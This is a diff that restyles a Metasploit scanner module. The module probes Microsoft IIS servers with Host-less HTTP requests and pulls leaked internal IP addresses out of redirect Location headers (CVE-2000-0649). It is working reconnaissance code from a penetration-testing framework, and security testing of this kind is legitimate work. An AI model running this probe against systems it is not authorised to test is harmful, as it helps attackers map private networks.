@@ -7,28 +7,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'        => 'Microsoft IIS HTTP Internal IP Disclosure',
-      'Description' => %q{
-        Collect any leaked internal IPs by requesting commonly redirected locations from IIS.
-      },
-      'Author'       => ['Heather Pilkington'],
-      'License'     => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2000-0649'],
-          ['BID', '1499'],
-          ['EDB', '20096']
-        ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft IIS HTTP Internal IP Disclosure',
+        'Description' => %q{
+          Collect any leaked internal IPs by requesting commonly redirected locations from IIS.
+        },
+        'Author' => ['Heather Pilkington'],
+        'License' => MSF_LICENSE,
+        'References' =>
+          [
+            ['CVE', '2000-0649'],
+            ['BID', '1499'],
+            ['EDB', '20096']
+          ]
+      )
+    )
   end
 
   def run_host(target_host)
-    uris = ["/","/images","/default.htm"]
+    uris = ['/', '/images', '/default.htm']
 
     uris.each do |uri|
-      #Must use send_recv() in order to send a HTTP request without the 'Host' header
+      # Must use send_recv() in order to send a HTTP request without the 'Host' header
       request = "GET #{uri} HTTP/1.0"
       vhost_status = datastore['VHOST'].blank? ? '' : " against #{vhost}"
       vprint_status("#{peer} - Requesting #{request}#{vhost_status}")
@@ -38,25 +41,24 @@ class MetasploitModule < Msf::Auxiliary
       if res.nil?
         print_error("no response for #{target_host}")
 
-      elsif (res.code > 300 and res.code < 310)
+      elsif ((res.code > 300) && (res.code < 310))
         intipregex = /(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/i
-        print_good("Location Header: #{res.headers["Location"]}")
-        result = res.headers["Location"].scan(intipregex).uniq.flatten
+        print_good("Location Header: #{res.headers['Location']}")
+        result = res.headers['Location'].scan(intipregex).uniq.flatten
 
-        if result.length > 0
+        if !result.empty?
           print_good("Result for #{target_host} found Internal IP:  #{result.first}")
         end
 
         report_note({
-          :host   => target_host,
-          :port   => rport,
-          :proto => 'tcp',
-          :sname  => (ssl ? 'https' : 'http'),
-          :type   => 'iis.ip',
-          :data   => result.first
+          host: target_host,
+          port: rport,
+          proto: 'tcp',
+          sname: (ssl ? 'https' : 'http'),
+          type: 'iis.ip',
+          data: result.first
         })
       end
-
     end
   end
 end
